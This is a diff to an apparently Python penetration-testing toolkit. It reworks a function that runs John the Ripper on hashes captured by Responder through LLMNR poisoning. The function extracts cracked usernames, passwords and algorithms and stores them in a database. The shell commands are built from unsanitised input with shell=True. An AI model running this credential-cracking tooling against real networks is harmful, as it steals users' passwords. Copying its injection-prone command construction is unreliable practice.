@@ -1878,14 +1878,38 @@ def start_listener():
 def crack_hash_generated():
     hash_file = input("Input name of hash file: ")
     remove_pot_file = subprocess.call("rm /root/.john/john.pot", shell = True)
-    crack_hash = subprocess.call(['gnome-terminal', '-e', 'bash -c "john Responder/logs/{}; exec bash"'.format(hash_file)])
-    show_hash = subprocess.call("john Responder/logs/{} --show".format(hash_file), shell=True)
-    print(type(show_hash))
-    clean_hashA = show_hash[2:]
-    clean_hashB = clean_hashA.split(":")
+    crack_hash = subprocess.check_output("john Responder/logs/{}".format(hash_file), shell=True)
+    show_hash = subprocess.check_output("john Responder/logs/{} --show".format(hash_file), shell=True)
+    raw_output = str(crack_hash)
+    posA = 0
+    posB = 0
+    pos = 0
+    for i in raw_output:
+        pos += 1
+        if i == "(":
+            posA = pos
+            continue
+        if i == ")":
+            posB = pos
+            break
+    crack_algo = raw_output[posA:posB-1]
+    pos1 = 0
+    pos2 = 0
+    pos = 0
+    for i in raw_output[posB:]:
+        pos += 1
+        if i == "(":
+            pos1 = pos
+            continue
+        if i == ")":
+            pos2 = pos
+            break
+    crack_usr = raw_output[posB+pos1:posB+pos2-1]
+    crack_pwd = raw_output[posB+2:posB+pos1-1]
+    llist = [crack_usr, crack_pwd, crack_algo]
     cur.execute('''INSERT INTO ExpDB.LLMNR 
-    (id, Username, Password, Domain, Password_Hash) 
-    VALUES (NULL, ?, ?, ?, ?)''', clean_hashB)
+    (id, Username, Password, Algorithm) 
+    VALUES (NULL, ?, ?, ?)''', llist)
     conn.commit()
 
 def zap_scan():
